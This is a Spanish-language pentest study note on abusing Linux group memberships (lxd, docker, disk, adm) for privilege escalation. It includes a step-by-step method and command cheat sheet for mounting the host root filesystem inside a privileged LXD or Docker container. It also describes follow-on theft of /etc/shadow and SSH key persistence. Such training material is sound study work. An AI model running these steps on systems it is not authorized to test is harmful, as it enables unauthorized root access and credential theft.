---
tags:
  - linux
  - privex
---
## Conceptos Clave (TL;DR)

* La membresía a ciertos grupos predeterminados en Linux puede ser abusada para obtener privilegios administrativos o leer archivos críticos del sistema anfitrión. 
* **LXD y Docker:** Permiten la creación de contenedores virtuales con configuraciones que montan el sistema de archivos del anfitrión de manera insegura, otorgando acceso a los archivos locales al usuario root del contenedor. 
* **Disk:** Brinda acceso sin restricciones a los dispositivos de hardware a nivel de bloque (ej. `/dev/sda1`), posibilitando la lectura del sistema de archivos con permisos totales.
* **ADM:** Habilita la lectura de todos los archivos de registro del sistema almacenados en `/var/log`, útil para recolectar información sensible o descubrir tareas programadas. 

## Herramientas Clave

* **lxc / lxd:** Gestor de contenedores en Ubuntu (similar a Docker). Abusado para inicializar contenedores en modo privilegiado y deshabilitar los controles de aislamiento de usuarios.
* **docker:** Utilizado para forzar el montaje de volúmenes críticos del sistema host en un entorno aislado donde se tiene acceso como root.
* **debugfs:** Herramienta utilizada por miembros del grupo `disk` para interactuar con sistemas de archivos a bajo nivel y acceder a todo el contenido del disco como root. 

## Metodología Paso a Paso

### Fase 1: Enumeración
El primer paso es comprobar la identidad del usuario actual y los grupos a los que pertenece en la sesión comprometida. Buscar la presencia de `lxd`, `docker`, `disk` o `adm`. 

### Fase 2: Escalación vía LXD
La lógica de este ataque consiste en importar una imagen descargada, crear una instancia indicando que no debe existir aislamiento de usuarios (contenedor privilegiado) y montar la raíz del servidor vulnerable dentro del contenedor.

1. Descomprimir los archivos de la imagen base que servirá para el contenedor.
2. Ejecutar la inicialización del gestor LXD, aceptando la configuración por defecto para preparar el entorno.
3. Importar la imagen descomprimida al registro local del gestor LXD y asignarle un nombre temporal.
4. Crear el contenedor especificando una bandera de seguridad que remueve el mapeo de UID. Esto provoca que la cuenta root dentro del contenedor coincida exactamente con la cuenta root del sistema real. 
5. Adicionar un dispositivo virtual al contenedor que apunte físicamente al directorio raíz (`/`) del anfitrión y lo refleje de forma recursiva en una ruta local del contenedor. 
6. Iniciar el contenedor, ejecutar una terminal e interactuar libremente con los archivos del servidor comprometido. 

### Fase 3: Escalación vía Docker
Al pertenecer al grupo `docker`, el usuario interactúa con el daemon sin requerir contraseña. La meta es crear rápidamente un contenedor que monte carpetas específicas (como `/root` o `/etc`) para manipular credenciales o claves de acceso. 

### Fase 4: Consolidación (Post-Montaje)
Una vez dentro del contenedor (LXD o Docker) con acceso a los archivos del host, se procede a la exfiltración de secretos, lectura de `/etc/shadow` o manipulación del archivo `authorized_keys` de SSH para afianzar la persistencia en el sistema.

## Cheat Sheet de Comandos

### Enumeración Básica
```bash
# Imprime el UID y los grupos del usuario actual para detectar vectores de escalación
id
```
### Escalación con LXD
```bash
# Descomprimir el archivo ZIP que contiene la imagen del contenedor (ej. Alpine)
unzip <IMAGE_ZIP_FILE>

# Iniciar configuración del entorno LXD (aceptar todas las opciones por defecto que se presenten)
lxd init

# Importar la imagen indicando sus componentes y asignando un alias identificador
lxc image import <TAR_GZ_FILE> <TAR_GZ_ROOT_FILE> --alias <IMAGE_ALIAS>

# Crear el contenedor y deshabilitar el mapeo de usuarios aislando la seguridad (security.privileged=true)
lxc init <IMAGE_ALIAS> <CONTAINER_NAME> -c security.privileged=true

# Montar el sistema de archivos raíz del host (/) en el directorio /mnt/root del contenedor
lxc config device add <CONTAINER_NAME> <DEVICE_NAME> disk source=/ path=/mnt/root recursive=true

# Iniciar la instancia del contenedor
lxc start <CONTAINER_NAME>

# Generar y acceder a una shell interactiva dentro del contenedor como usuario root
lxc exec <CONTAINER_NAME> /bin/sh

# Navegar hasta la ruta donde se expuso la información del sistema anfitrión
cd /mnt/root/root
```
### Escalación con Docker
```bash
# Iniciar una instancia de Docker montando el directorio /root del anfitrión dentro del volumen /mnt del contenedor
docker run -v /root:/mnt -it <IMAGE_NAME>
```

## "Gotchas" y Troubleshooting

* **Privilegios en LXD:** Es mandatorio que el contenedor se cree con `-c security.privileged=true`. Si se omite, el contenedor conservará el mapeo de UID y el usuario root del contenedor no tendrá acceso de administrador sobre los archivos del host montados. 
* **Errores de Red al Inicializar LXD:** Durante la ejecución de `lxd init`, es común recibir un error al configurar el puente de red (`error: Failed to configure the bridge`) ya que el binario de dpkg-reconfigure exige permisos root. Este error no bloquea el flujo del ataque local y puede ser ignorado de forma segura. 
* **Limitación del Grupo ADM:** Este vector no otorga control directo a una shell con privilegios elevados. El éxito recae en un análisis profundo de las bitácoras para descubrir credenciales escritas en texto claro u otras interacciones críticas realizadas por administradores legítimos. 
* **Enfoque en Exfiltración con Disk/Docker:** El acceso a `/dev` o mediante volúmenes de Docker se aprovecha principalmente para realizar ataques "offline" leyendo el archivo `/etc/shadow` o modificando parámetros directamente en el disco.